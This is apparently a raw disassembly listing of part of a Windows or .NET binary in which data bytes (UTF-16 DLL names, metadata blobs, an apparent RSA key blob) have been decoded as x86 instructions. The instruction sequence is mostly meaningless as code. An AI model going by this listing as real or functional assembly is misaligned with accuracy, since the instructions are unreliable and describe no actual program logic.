  40afc1:	add    BYTE PTR [ecx+0x0],ah
  40afc4:	add    BYTE PTR [bx+0x0],cl
  40afc8:	bound  eax,QWORD PTR [eax]
  40afca:	jae    0x40afcc
  40afcc:	outs   dx,DWORD PTR ds:[esi]
  40afcd:	add    BYTE PTR [eax+eax*1+0x65],ch
  40afd1:	add    BYTE PTR [eax+eax*1+0x65],dh
  40afd5:	add    BYTE PTR [edi+ecx*2],dl
  40afd8:	add    BYTE PTR [esi+0x0],ch
  40afdb:	ins    BYTE PTR es:[edi],dx
  40afdc:	add    BYTE PTR [ecx+0x0],bh
  40afdf:	push   ebx
  40afe0:	add    BYTE PTR [eax+eax*1+0x72],dh
  40afe4:	add    BYTE PTR [ecx+0x0],ch
  40afe7:	outs   dx,BYTE PTR ds:[esi]
  40afe8:	add    BYTE PTR [edi+0x0],ah
  40afeb:	and    al,0x55
  40afed:	add    BYTE PTR [esi+0x0],ch
  40aff0:	ins    DWORD PTR es:[edi],dx
  40aff1:	add    BYTE PTR [ecx+0x0],ah
  40aff4:	jo     0x40aff6
  40aff6:	jo     0x40aff8
  40aff8:	popa   
  40aff9:	add    BYTE PTR [edx+0x0],ah
  40affc:	ins    BYTE PTR es:[edi],dx
  40affd:	add    BYTE PTR [ebp+0x0],ah
  40b000:	push   edx
  40b001:	add    BYTE PTR [ebp+0x0],ah
  40b004:	jae    0x40b006
  40b006:	outs   dx,DWORD PTR ds:[esi]
  40b007:	add    BYTE PTR [ebp+0x0],dh
  40b00a:	jb     0x40b00c
  40b00c:	arpl   WORD PTR [eax],ax
  40b00e:	add    BYTE PTR gs:[edx],cl
  40b011:	push   ebp
  40b012:	add    BYTE PTR [ebx+0x0],dh
  40b015:	popa   
  40b016:	add    BYTE PTR [edi+0x0],ah
  40b019:	add    BYTE PTR gs:[eax],dh
  40b01c:	dec    ecx
  40b01d:	add    BYTE PTR [esi+0x0],ch
  40b020:	jbe    0x40b022
  40b022:	popa   
  40b023:	add    BYTE PTR [eax+eax*1+0x69],ch
  40b027:	add    BYTE PTR [eax+eax*1+0x43],ah
  40b02b:	add    BYTE PTR [edi+0x0],ch
  40b02e:	ins    DWORD PTR es:[edi],dx
  40b02f:	add    BYTE PTR [ebp+0x0],ch
  40b032:	popa   
  40b033:	add    BYTE PTR [esi+0x0],ch
  40b036:	add    BYTE PTR fs:[eax+eax*1+0x69],cl
  40b03b:	add    BYTE PTR [esi+0x0],ch
  40b03e:	add    BYTE PTR gs:[ebx+0x0],dl
  40b042:	jns    0x40b044
  40b044:	outs   dx,BYTE PTR ds:[esi]
  40b045:	add    BYTE PTR [eax+eax*1+0x61],dh
  40b049:	add    BYTE PTR [eax+0x0],bh
  40b04c:	sub    BYTE PTR [ebx+0x0],al
  40b04f:	outs   dx,DWORD PTR ds:[esi]
  40b050:	add    BYTE PTR [ebp+0x0],ch
  40b053:	jo     0x40b055
  40b055:	imul   eax,DWORD PTR [eax],0x65006c
  40b05b:	inc    ecx
  40b05c:	add    BYTE PTR [esi+0x0],ch
  40b05f:	add    BYTE PTR fs:[ebx+0x0],dl
  40b063:	push   esp
  40b064:	add    BYTE PTR [edx+0x0],dl
  40b067:	inc    esp
  40b068:	add    BYTE PTR [edi+0x0],ch
  40b06b:	outs   dx,BYTE PTR ds:[esi]
  40b06c:	add    BYTE PTR [eax+eax*1+0x4d],dh
  40b070:	add    BYTE PTR [ecx+0x0],ch
  40b073:	js     0x40b075
  40b075:	and    BYTE PTR [ebx+0x0],al
  40b078:	popa   
  40b079:	add    BYTE PTR [esi+0x0],ch
  40b07c:	je     0x40b07e
  40b07e:	dec    esp
  40b07f:	add    BYTE PTR [edi+0x0],ch
  40b082:	popa   
  40b083:	add    BYTE PTR [eax+eax*1+0x41],ah
  40b087:	add    BYTE PTR [ebx+0x0],dh
  40b08a:	jae    0x40b08c
  40b08c:	add    BYTE PTR gs:[ebp+0x0],ch
  40b090:	bound  eax,QWORD PTR [eax]
  40b092:	ins    BYTE PTR es:[edi],dx
  40b093:	add    BYTE PTR [ecx+0x0],bh
  40b096:	xor    al,0x43
  40b098:	add    BYTE PTR [eax+eax*1+0x61],ch
  40b09c:	add    BYTE PTR [ebx+0x0],dh
  40b09f:	jae    0x40b0a1
  40b0a1:	outs   dx,BYTE PTR ds:[esi]
  40b0a2:	add    BYTE PTR [ecx+0x0],ah
  40b0a5:	ins    DWORD PTR es:[edi],dx
  40b0a6:	add    BYTE PTR [ebp+0x0],ah
  40b0a9:	dec    ebp
  40b0aa:	add    BYTE PTR [ebp+0x0],dh
  40b0ad:	jae    0x40b0af
  40b0af:	je     0x40b0b1
  40b0b1:	dec    ebp
  40b0b2:	add    BYTE PTR [ecx+0x0],ah
  40b0b5:	je     0x40b0b7
  40b0b7:	arpl   WORD PTR [eax],ax
  40b0b9:	push   0x61004200
  40b0be:	add    BYTE PTR [ebx+0x0],dh
  40b0c1:	add    BYTE PTR gs:[esi+0x0],ch
  40b0c5:	popa   
  40b0c6:	add    BYTE PTR [ebp+0x0],ch
  40b0c9:	add    BYTE PTR gs:[esi+edx*2],bl
  40b0cd:	add    BYTE PTR [ecx+0x0],ah
  40b0d0:	ins    BYTE PTR es:[edi],dx
  40b0d1:	add    BYTE PTR [ecx+0x0],ch
  40b0d4:	add    BYTE PTR fs:[eax+eax*1+0x61],cl
  40b0d9:	add    BYTE PTR [esi+0x0],ch
  40b0dc:	add    BYTE PTR [di+0x0],dh
  40b0e0:	popa   
  40b0e1:	add    BYTE PTR [edi+0x0],ah
  40b0e4:	add    BYTE PTR gs:[ebx+0x0],dh
  40b0e8:	add    eax,DWORD PTR [esi]
  40b0ea:	adc    ch,BYTE PTR [eax]
  40b0ec:	add    esp,DWORD PTR [eax]
  40b0ee:	add    BYTE PTR [ecx],al
  40b0f0:	add    al,0x0
  40b0f2:	add    BYTE PTR [edx],dl
  40b0f4:	sub    BYTE PTR [eax+eax*1],al
  40b0f7:	add    BYTE PTR [edx],dl
  40b0f9:	and    DWORD PTR [eax+eax*1],eax
  40b0fc:	add    BYTE PTR [edx],dl
  40b0fe:	sbb    eax,0xe020006
  40b103:	push   cs
  40b104:	sbb    eax,0x100041c
  40b109:	sbb    al,0xe
  40b10b:	add    al,0x8
  40b10d:	add    BYTE PTR [edx],dl
  40b10f:	and    DWORD PTR [eax+ecx*1],eax
  40b112:	add    BYTE PTR [edx],dl
  40b114:	sbb    eax,0x63006118
  40b119:	add    BYTE PTR [eax+eax*1+0x69],dh
  40b11d:	add    BYTE PTR [esi+0x0],dh
  40b120:	add    BYTE PTR gs:[eax+eax*1+0x73],ah
  40b125:	add    BYTE PTR [esi],ch
  40b127:	add    BYTE PTR [eax+eax*1+0x6c],ah
  40b12b:	add    BYTE PTR [eax+eax*1+0x18],ch
  40b12f:	popa   
  40b130:	add    BYTE PTR [eax+eax*1+0x76],ah
  40b134:	add    BYTE PTR [ecx+0x0],ah
  40b137:	jo     0x40b139
  40b139:	imul   eax,DWORD PTR [eax],0x320033
  40b13f:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  40b144:	add    BYTE PTR [eax+eax*1+0x18],ch
  40b148:	arpl   WORD PTR [eax],ax
  40b14a:	outs   dx,DWORD PTR ds:[esi]
  40b14b:	add    BYTE PTR [ebp+0x0],ch
  40b14e:	arpl   WORD PTR [eax],ax
  40b150:	je     0x40b152
  40b152:	ins    BYTE PTR es:[edi],dx
  40b153:	add    BYTE PTR [ebx],dh
  40b155:	add    BYTE PTR [edx],dh
  40b157:	add    BYTE PTR [esi],ch
  40b159:	add    BYTE PTR [eax+eax*1+0x6c],ah
  40b15d:	add    BYTE PTR [eax+eax*1+0x18],ch
  40b161:	arpl   WORD PTR [eax],ax
  40b163:	outs   dx,DWORD PTR ds:[esi]
  40b164:	add    BYTE PTR [ebp+0x0],ch
  40b167:	add    BYTE PTR fs:[eax+eax*1+0x67],ch
  40b16c:	add    BYTE PTR [ebx],dh
  40b16e:	add    BYTE PTR [edx],dh
  40b170:	add    BYTE PTR [esi],ch
  40b172:	add    BYTE PTR [eax+eax*1+0x6c],ah
  40b176:	add    BYTE PTR [eax+eax*1+0x12],ch
  40b17a:	add    BYTE PTR [si+0x0],ah
  40b17e:	imul   eax,DWORD PTR [eax],0x320033
  40b184:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  40b189:	add    BYTE PTR [eax+eax*1+0x16],ch
  40b18d:	add    BYTE PTR [si+0x0],ah
  40b191:	imul   eax,DWORD PTR [eax],0x6c0070
  40b197:	jne    0x40b199
  40b199:	jae    0x40b19b
  40b19b:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  40b1a0:	add    BYTE PTR [eax+eax*1+0x14],ch
  40b1a4:	push   0x63006800
  40b1a9:	add    BYTE PTR [eax+eax*1+0x72],dh
  40b1ad:	add    BYTE PTR [eax+eax*1+0x2e],ch
  40b1b1:	add    BYTE PTR [edi+0x0],ch
  40b1b4:	arpl   WORD PTR [eax],ax
  40b1b6:	js     0x40b1b8
  40b1b8:	adc    ch,BYTE PTR [ecx+0x0]
  40b1bb:	ins    DWORD PTR es:[edi],dx
  40b1bc:	add    BYTE PTR [ebp+0x0],ch
  40b1bf:	xor    eax,DWORD PTR [eax]
  40b1c1:	xor    al,BYTE PTR [eax]
  40b1c3:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  40b1c8:	add    BYTE PTR [eax+eax*1+0x18],ch
  40b1cc:	imul   eax,DWORD PTR [eax],0x65
  40b1cf:	add    BYTE PTR [edx+0x0],dh
  40b1d2:	outs   dx,BYTE PTR ds:[esi]
  40b1d3:	add    BYTE PTR [ebp+0x0],ah
  40b1d6:	ins    BYTE PTR es:[edi],dx
  40b1d7:	add    BYTE PTR [ebx],dh
  40b1d9:	add    BYTE PTR [edx],dh
  40b1db:	add    BYTE PTR [esi],ch
  40b1dd:	add    BYTE PTR [eax+eax*1+0x6c],ah
  40b1e1:	add    BYTE PTR [eax+eax*1+0x18],ch
  40b1e5:	dec    esp
  40b1e6:	add    BYTE PTR [edi+0x0],ch
  40b1e9:	popa   
  40b1ea:	add    BYTE PTR [eax+eax*1+0x70],ah
  40b1ee:	add    BYTE PTR [ebp+0x0],ah
  40b1f1:	jb     0x40b1f3
  40b1f3:	data16 add BYTE PTR [esi],ch
  40b1f6:	add    BYTE PTR [eax+eax*1+0x6c],ah
  40b1fa:	add    BYTE PTR [eax+eax*1+0x16],ch
  40b1fe:	ins    DWORD PTR es:[edi],dx
  40b1ff:	add    BYTE PTR [ebx+0x0],dh
  40b202:	arpl   WORD PTR [eax],ax
  40b204:	outs   dx,DWORD PTR ds:[esi]
  40b205:	add    BYTE PTR [edx+0x0],dh
  40b208:	add    BYTE PTR gs:[ebp+0x0],ah
  40b20c:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  40b211:	add    BYTE PTR [eax+eax*1+0x18],ch
  40b215:	ins    DWORD PTR es:[edi],dx
  40b216:	add    BYTE PTR [ebx+0x0],dh
  40b219:	arpl   WORD PTR [eax],ax
  40b21b:	outs   dx,DWORD PTR ds:[esi]
  40b21c:	add    BYTE PTR [edx+0x0],dh
  40b21f:	ja     0x40b221
  40b221:	imul   eax,DWORD PTR [eax],0x73
  40b224:	add    BYTE PTR [esi],ch
  40b226:	add    BYTE PTR [eax+eax*1+0x6c],ah
  40b22a:	add    BYTE PTR [eax+eax*1+0xe],ch
  40b22e:	ins    DWORD PTR es:[edi],dx
  40b22f:	add    BYTE PTR [ebx+0x0],dh
  40b232:	imul   eax,DWORD PTR [eax],0x64002e
  40b238:	ins    BYTE PTR es:[edi],dx
  40b239:	add    BYTE PTR [eax+eax*1+0x10],ch
  40b23d:	ins    DWORD PTR es:[edi],dx
  40b23e:	add    BYTE PTR [ecx+0x0],dh
  40b241:	jb     0x40b243
  40b243:	je     0x40b245
  40b245:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  40b24a:	add    BYTE PTR [eax+eax*1+0x12],ch
  40b24e:	outs   dx,BYTE PTR ds:[esi]
  40b24f:	add    BYTE PTR [eax+eax*1+0x64],dh
  40b253:	add    BYTE PTR [eax+eax*1+0x6c],ch
  40b257:	add    BYTE PTR [esi],ch
  40b259:	add    BYTE PTR [eax+eax*1+0x6c],ah
  40b25d:	add    BYTE PTR [eax+eax*1+0x12],ch
  40b261:	outs   dx,DWORD PTR ds:[esi]
  40b262:	add    BYTE PTR [eax+eax*1+0x65],ch
  40b266:	add    BYTE PTR [ebx],dh
  40b268:	add    BYTE PTR [edx],dh
  40b26a:	add    BYTE PTR [esi],ch
  40b26c:	add    BYTE PTR [eax+eax*1+0x6c],ah
  40b270:	add    BYTE PTR [eax+eax*1+0x14],ch
  40b274:	outs   dx,DWORD PTR ds:[esi]
  40b275:	add    BYTE PTR [eax+eax*1+0x65],ch
  40b279:	add    BYTE PTR [ecx+0x0],ah
  40b27c:	arpl   WORD PTR [eax],ax
  40b27e:	arpl   WORD PTR [eax],ax
  40b280:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  40b285:	add    BYTE PTR [eax+eax*1+0x18],ch
  40b289:	outs   dx,DWORD PTR ds:[esi]
  40b28a:	add    BYTE PTR [eax+eax*1+0x65],ch
  40b28e:	add    BYTE PTR [ecx+0x0],ah
  40b291:	jne    0x40b293
  40b293:	je     0x40b295
  40b295:	xor    eax,DWORD PTR [eax]
  40b297:	xor    al,BYTE PTR [eax]
  40b299:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  40b29e:	add    BYTE PTR [eax+eax*1+0x18],ch
  40b2a2:	outs   dx,DWORD PTR ds:[esi]
  40b2a3:	add    BYTE PTR [eax+eax*1+0x65],ch
  40b2a7:	add    BYTE PTR [eax+0x0],dh
  40b2aa:	jb     0x40b2ac
  40b2ac:	outs   dx,DWORD PTR ds:[esi]
  40b2ad:	add    BYTE PTR [ebx],dh
  40b2af:	add    BYTE PTR [edx],dh
  40b2b1:	add    BYTE PTR [esi],ch
  40b2b3:	add    BYTE PTR [eax+eax*1+0x6c],ah
  40b2b7:	add    BYTE PTR [eax+eax*1+0x1e],ch
  40b2bb:	jo     0x40b2bd
  40b2bd:	add    BYTE PTR gs:[edx+0x0],dh
  40b2c1:	data16 add BYTE PTR [ebx+0x0],ah
  40b2c5:	outs   dx,DWORD PTR ds:[esi]
  40b2c6:	add    BYTE PTR [ebp+0x0],dh
  40b2c9:	outs   dx,BYTE PTR ds:[esi]
  40b2ca:	add    BYTE PTR [eax+eax*1+0x65],dh
  40b2ce:	add    BYTE PTR [edx+0x0],dh
  40b2d1:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  40b2d6:	add    BYTE PTR [eax+eax*1+0x18],ch
  40b2da:	push   eax
  40b2db:	add    BYTE PTR [edi+0x0],ch
  40b2de:	ja     0x40b2e0
  40b2e0:	jb     0x40b2e2
  40b2e2:	jo     0x40b2e4
  40b2e4:	jb     0x40b2e6
  40b2e6:	outs   dx,DWORD PTR ds:[esi]
  40b2e7:	add    BYTE PTR [esi+0x0],ah
  40b2ea:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  40b2ef:	add    BYTE PTR [eax+eax*1+0x12],ch
  40b2f3:	jo     0x40b2f5
  40b2f5:	jae    0x40b2f7
  40b2f7:	popa   
  40b2f8:	add    BYTE PTR [eax+0x0],dh
  40b2fb:	imul   eax,DWORD PTR [eax],0x64002e
  40b301:	ins    BYTE PTR es:[edi],dx
  40b302:	add    BYTE PTR [eax+eax*1+0x16],ch
  40b306:	jae    0x40b308
  40b308:	push   0x6c006500
  40b30d:	add    BYTE PTR [eax+eax*1+0x33],ch
  40b311:	add    BYTE PTR [edx],dh
  40b313:	add    BYTE PTR [esi],ch
  40b315:	add    BYTE PTR [eax+eax*1+0x6c],ah
  40b319:	add    BYTE PTR [eax+eax*1+0x18],ch
  40b31d:	jae    0x40b31f
  40b31f:	push   0x6f006600
  40b324:	add    BYTE PTR [eax+eax*1+0x64],ch
  40b328:	add    BYTE PTR [ebp+0x0],ah
  40b32b:	jb     0x40b32d
  40b32d:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  40b332:	add    BYTE PTR [eax+eax*1+0x14],ch
  40b336:	jne    0x40b338
  40b338:	jae    0x40b33a
  40b33a:	add    BYTE PTR gs:[edx+0x0],dh
  40b33e:	xor    eax,DWORD PTR [eax]
  40b340:	xor    al,BYTE PTR [eax]
  40b342:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  40b347:	add    BYTE PTR [eax+eax*1+0x16],ch
  40b34b:	jne    0x40b34d
  40b34d:	js     0x40b34f
  40b34f:	je     0x40b351
  40b351:	push   0x6d006500
  40b356:	add    BYTE PTR [ebp+0x0],ah
  40b359:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  40b35e:	add    BYTE PTR [eax+eax*1+0x12],ch
  40b362:	ja     0x40b364
  40b364:	imul   eax,DWORD PTR [eax],0x6d006e
  40b36a:	ins    DWORD PTR es:[edi],dx
  40b36b:	add    BYTE PTR [esi],ch
  40b36d:	add    BYTE PTR [eax+eax*1+0x6c],ah
  40b371:	add    BYTE PTR [eax+eax*1+0x18],ch
  40b375:	ja     0x40b377
  40b377:	imul   eax,DWORD PTR [eax],0x73006e
  40b37d:	jo     0x40b37f
  40b37f:	outs   dx,DWORD PTR ds:[esi]
  40b380:	add    BYTE PTR [edi+0x0],ch
  40b383:	ins    BYTE PTR es:[edi],dx
  40b384:	add    BYTE PTR [esi],ch
  40b386:	add    BYTE PTR [eax+eax*1+0x72],ah
  40b38a:	add    BYTE PTR [esi+0x0],dh
  40b38d:	sbb    BYTE PTR [edi+0x0],dh
  40b390:	je     0x40b392
  40b392:	jae    0x40b394
  40b394:	popa   
  40b395:	add    BYTE PTR [eax+0x0],dh
  40b398:	imul   eax,DWORD PTR [eax],0x320033
  40b39e:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  40b3a3:	add    BYTE PTR [eax+eax*1+0x16],ch
  40b3a7:	jbe    0x40b3a9
  40b3a9:	add    BYTE PTR gs:[edx+0x0],dh
  40b3ad:	jae    0x40b3af
  40b3af:	imul   eax,DWORD PTR [eax],0x6e006f
  40b3b5:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  40b3ba:	add    BYTE PTR [eax+eax*1+0x18],ch
  40b3be:	jbe    0x40b3c0
  40b3c0:	jae    0x40b3c2
  40b3c2:	popa   
  40b3c3:	add    BYTE PTR [ebx+0x0],dh
  40b3c6:	jae    0x40b3c8
  40b3c8:	add    BYTE PTR gs:[edx+0x0],dh
  40b3cc:	je     0x40b3ce
  40b3ce:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  40b3d3:	add    BYTE PTR [eax+eax*1+0x16],ch
  40b3d7:	jae    0x40b3d9
  40b3d9:	push   0x77006c00
  40b3de:	add    BYTE PTR [ecx+0x0],ah
  40b3e1:	jo     0x40b3e3
  40b3e3:	imul   eax,DWORD PTR [eax],0x64002e
  40b3e9:	ins    BYTE PTR es:[edi],dx
  40b3ea:	add    BYTE PTR [eax+eax*1+0x16],ch
  40b3ee:	arpl   WORD PTR [eax],ax
  40b3f0:	jb     0x40b3f2
  40b3f2:	jns    0x40b3f4
  40b3f4:	jo     0x40b3f6
  40b3f6:	je     0x40b3f8
  40b3f8:	xor    eax,DWORD PTR [eax]
  40b3fa:	xor    al,BYTE PTR [eax]
  40b3fc:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  40b401:	add    BYTE PTR [eax+eax*1+0x14],ch
  40b405:	outs   dx,DWORD PTR ds:[esi]
  40b406:	add    BYTE PTR [eax+eax*1+0x62],ah
  40b40a:	add    BYTE PTR [ebx+0x0],ah
  40b40d:	xor    eax,DWORD PTR [eax]
  40b40f:	xor    al,BYTE PTR [eax]
  40b411:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  40b416:	add    BYTE PTR [eax+eax*1+0x1e],ch
  40b41a:	push   ebx
  40b41b:	add    BYTE PTR [ecx+0x0],bh
  40b41e:	jae    0x40b420
  40b420:	je     0x40b422
  40b422:	add    BYTE PTR gs:[ebp+0x0],ch
  40b426:	add    BYTE PTR cs:[eax+eax*1+0x61],al
  40b42b:	add    BYTE PTR [eax+eax*1+0x61],dh
  40b42f:	add    BYTE PTR [esi],ch
  40b431:	add    BYTE PTR [eax+eax*1+0x6c],ah
  40b435:	add    BYTE PTR [eax+eax*1+0xe],ch
  40b439:	outs   dx,DWORD PTR ds:[esi]
  40b43a:	add    BYTE PTR [ebx+0x0],ah
  40b43d:	imul   eax,DWORD PTR [eax],0x64002e
  40b443:	ins    BYTE PTR es:[edi],dx
  40b444:	add    BYTE PTR [eax+eax*1+0x14],ch
  40b448:	outs   dx,DWORD PTR ds:[esi]
  40b449:	add    BYTE PTR [edx+0x0],dh
  40b44c:	popa   
  40b44d:	add    BYTE PTR [ebp+0x0],ch
  40b450:	je     0x40b452
  40b452:	jae    0x40b454
  40b454:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  40b459:	add    BYTE PTR [eax+eax*1+0x4],ch
  40b45d:	(bad)  
  40b45e:	(bad)  
  40b45f:	(bad)  
  40b460:	inc    DWORD PTR [ebx]
  40b462:	push   es
  40b463:	adc    ah,BYTE PTR ds:0x29120603
  40b469:	pop    es
  40b46a:	push   es
  40b46b:	adc    eax,0x12012d12
  40b470:	xor    DWORD PTR [eax],ecx
  40b472:	add    BYTE PTR ds:0xe1c0e01,al
  40b478:	or     BYTE PTR [eax],cl
  40b47a:	push   es
  40b47b:	add    BYTE PTR [ebx],al
  40b47d:	add    DWORD PTR [esi],ecx
  40b47f:	sbb    al,0xe
  40b481:	add    al,0x0
  40b483:	add    DWORD PTR [ecx],eax
  40b485:	push   cs
  40b486:	add    eax,0xe010200
  40b48b:	or     BYTE PTR ds:0xe010200,al
  40b491:	push   cs
  40b492:	push   es
  40b493:	add    BYTE PTR [ebx],al
  40b495:	add    DWORD PTR [esi],ecx
  40b497:	push   cs
  40b498:	or     BYTE PTR [edi],al
  40b49a:	add    BYTE PTR [ecx+eax*1],al
  40b49d:	push   cs
  40b49e:	push   cs
  40b49f:	or     BYTE PTR [eax],cl
  40b4a1:	or     BYTE PTR [eax],al
  40b4a3:	add    eax,0x80e0e01
  40b4a8:	or     BYTE PTR [eax],cl
  40b4aa:	add    eax,0x40110100
  40b4af:	push   cs
  40b4b0:	add    eax,0x1d010100
  40b4b5:	push   cs
  40b4b6:	add    al,0x0
  40b4b8:	add    DWORD PTR [edx],eax
  40b4ba:	push   cs
  40b4bb:	or     BYTE PTR [eax],al
  40b4bd:	add    al,0x1
  40b4bf:	push   cs
  40b4c0:	push   cs
  40b4c1:	adc    dh,BYTE PTR [edx+eax*1]
  40b4c4:	pop    es
  40b4c5:	add    BYTE PTR [edx],al
  40b4c7:	adc    dh,BYTE PTR ds:0x739121c
  40b4cd:	add    BYTE PTR [ebx],al
  40b4cf:	add    DWORD PTR [esi],ecx
  40b4d1:	adc    dh,BYTE PTR [esi+ecx*1]
  40b4d4:	add    eax,0xe010200
  40b4d9:	add    al,BYTE PTR [esi]
  40b4db:	add    BYTE PTR [edx],al
  40b4dd:	add    DWORD PTR [edx],edx
  40b4df:	cmp    eax,0x100050e
  40b4e4:	add    DWORD PTR [edx],edx
  40b4e6:	inc    ecx
  40b4e7:	add    eax,DWORD PTR [eax]
  40b4e9:	add    BYTE PTR [ecx],al
  40b4eb:	or     BYTE PTR [eax],ah
  40b4ed:	add    eax,0xe0e0e01
  40b4f2:	push   cs
  40b4f3:	add    al,BYTE PTR [ebx]
  40b4f5:	and    BYTE PTR [eax],al
  40b4f7:	add    al,BYTE PTR [eax+eiz*1]
  40b4fa:	add    DWORD PTR [ecx],eax
  40b4fc:	add    al,BYTE PTR [ebx]
  40b4fe:	sub    BYTE PTR [eax],al
  40b500:	add    al,BYTE PTR [edi]
  40b502:	and    BYTE PTR [ebx],al
  40b504:	add    DWORD PTR [esi],ecx
  40b506:	adc    al,BYTE PTR [ebp+0x2]
  40b509:	add    eax,0x12010120
  40b50e:	dec    ecx
  40b50f:	add    esp,DWORD PTR [eax]
  40b511:	add    BYTE PTR [eax],cl
  40b513:	pop    es
  40b514:	and    BYTE PTR [ebx],al
  40b516:	or     BYTE PTR ds:0x3080803,bl
  40b51c:	sub    BYTE PTR [eax],al
  40b51e:	or     BYTE PTR [edi],al
  40b520:	and    BYTE PTR [ecx+eax*1],al
  40b523:	push   cs
  40b524:	push   cs
  40b525:	or     BYTE PTR [eax],cl
  40b527:	add    eax,DWORD PTR [esi]
  40b529:	adc    DWORD PTR [eax+0x4],eax
  40b52c:	add    BYTE PTR [eax],al
  40b52e:	add    BYTE PTR [eax],al
  40b530:	add    al,0x1
  40b532:	add    BYTE PTR [eax],al
  40b534:	add    BYTE PTR [edx+eax*1],al
  40b537:	add    BYTE PTR [eax],al
  40b539:	add    BYTE PTR ds:0xe010220,al
  40b53f:	sbb    al,0x2
  40b541:	push   es
  40b542:	sbb    al,0x6
  40b544:	and    BYTE PTR [ecx],al
  40b546:	add    DWORD PTR [ecx],edx
  40b548:	sbb    BYTE PTR [ecx+0x1012004],0x8
  40b54f:	and    BYTE PTR [eax+0x2400],0x4
  40b556:	add    BYTE PTR [eax],0x0
  40b559:	xchg   esp,eax
  40b55a:	add    BYTE PTR [eax],al
  40b55c:	add    BYTE PTR [esi],al
  40b55e:	add    al,BYTE PTR [eax]
  40b560:	add    BYTE PTR [eax],al
  40b562:	and    al,0x0
  40b564:	add    BYTE PTR [edx+0x53],dl
  40b567:	inc    ecx
  40b568:	xor    DWORD PTR [eax],eax
  40b56a:	add    al,0x0
  40b56c:	add    BYTE PTR [ecx],al
  40b56e:	add    BYTE PTR [ecx],al
  40b570:	add    BYTE PTR [edi],al
  40b572:	sar    edx,1
  40b574:	push   edi
  40b575:	les    ebp,FWORD PTR [esi+0x2ea3f0d9]
  40b57b:	test   BYTE PTR [edx+0xdfdae0f],ch
  40b581:	jmp    0xecabb36e
  40b586:	pop    DWORD PTR [edi+0x6c7603fb]
  40b58c:	or     DWORD PTR [ecx+ebx*4-0x6e],0x1e
  40b591:	mov    dl,0x3b
  40b593:	out    0x9a,eax
  40b595:	(bad)  
  40b597:	fadd   st(1),st
  40b599:	fstp   QWORD PTR [edx+0x211336d2]
  40b59f:	add    dl,BYTE PTR [eax-0x6c38df5]
  40b5a5:	adc    BYTE PTR [ebp+0x77e1c47f],0x10
  40b5ac:	pop    esi
  40b5ae:	pop    es
  40b5af:	ja     0x40b600
  40b5b1:	sub    eax,ebp
  40b5b3:	xor    cl,BYTE PTR [esi]
  40b5b5:	xchg   edx,eax
  40b5b6:	jmp    0xc021:0xe8e4ec05
  40b5bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5be:	out    dx,eax
  40b5bf:	call   0x4c9d1ab5
  40b5c4:	or     al,0x93
  40b5c6:	shr    DWORD PTR [ebx+0x625d2899],0x2c
  40b5cd:	stos   BYTE PTR es:[edi],al
  40b5ce:	gs sub al,0x1d
  40b5d1:	cli    
  40b5d2:	(bad)  
  40b5d3:	cmp    eax,0x2d6f5d74
  40b5d8:	in     eax,0xf1
  40b5da:	jle    0x40b63a
  40b5dc:	scas   eax,DWORD PTR es:[edi]
  40b5dd:	pinsrw mm2,WORD PTR [esi-0x75e3d9c3],0x12
  40b5e5:	inc    ebx
  40b5e6:	sbb    BYTE PTR gs:[eax],ah
  40b5e9:	ins    DWORD PTR es:[edi],dx
  40b5ea:	rcl    BYTE PTR [ebx-0x2da5b2cc],0x93
  40b5f1:	add    al,0x0
  40b5f3:	add    BYTE PTR [edx],dl
  40b5f5:	xor    eax,0x1022006
  40b5fa:	push   cs
  40b5fb:	adc    dh,BYTE PTR ds:0x1012006
  40b601:	adc    DWORD PTR [eax+0x108a9],eax
  40b607:	(bad)  
  40b608:	jg     0x40b60a
  40b60a:	add    BYTE PTR [eax],al
  40b60c:	add    BYTE PTR ds:0x80120020,al
  40b612:	lods   eax,DWORD PTR ds:[esi]
  40b613:	add    al,0x20
  40b615:	add    BYTE PTR [edx],dl
  40b617:	xor    eax,0x301100c
  40b61c:	push   ds
  40b61d:	add    BYTE PTR [eax],dl
  40b61f:	push   ds
  40b620:	add    BYTE PTR [esi],bl
  40b622:	add    BYTE PTR [esi],bl
  40b624:	add    BYTE PTR [edx+ecx*1],al
  40b627:	add    DWORD PTR [edx],edx
  40b629:	sub    BYTE PTR [edi+eax*1],al
  40b62c:	add    DWORD PTR [edx],edx
  40b62e:	sub    BYTE PTR [esi],al
  40b630:	and    BYTE PTR [edx],al
  40b632:	push   cs
  40b633:	push   cs
  40b634:	adc    ah,BYTE PTR [ecx]
  40b636:	add    eax,0x80e0220
  40b63b:	or     BYTE PTR ds:0xe0e0200,al
  40b641:	push   cs
  40b642:	or     DWORD PTR [eax],eax
  40b644:	add    ecx,DWORD PTR [esi]
  40b646:	adc    al,BYTE PTR [eax+0x1c1d0eb9]
  40b64c:	pop    es
  40b64d:	pop    es
  40b64e:	add    al,0x12
  40b650:	sub    BYTE PTR [esi],cl
  40b652:	or     BYTE PTR [esi],cl
  40b654:	push   es
  40b655:	and    BYTE PTR [edx],al
  40b657:	sbb    al,0xe
  40b659:	adc    ah,BYTE PTR [ecx]
  40b65b:	add    al,0x20
  40b65d:	add    DWORD PTR [edx],eax
  40b65f:	sbb    al,0x4
  40b661:	and    BYTE PTR [ecx],al
  40b663:	or     BYTE PTR [eax*1+0x1c010220],bl
  40b66a:	sbb    al,0x6
  40b66c:	pop    es
  40b66d:	add    dl,BYTE PTR [edx]
  40b66f:	inc    esp
  40b670:	sbb    eax,0x51c
  40b675:	adc    al,BYTE PTR [eax+0x32006c1]
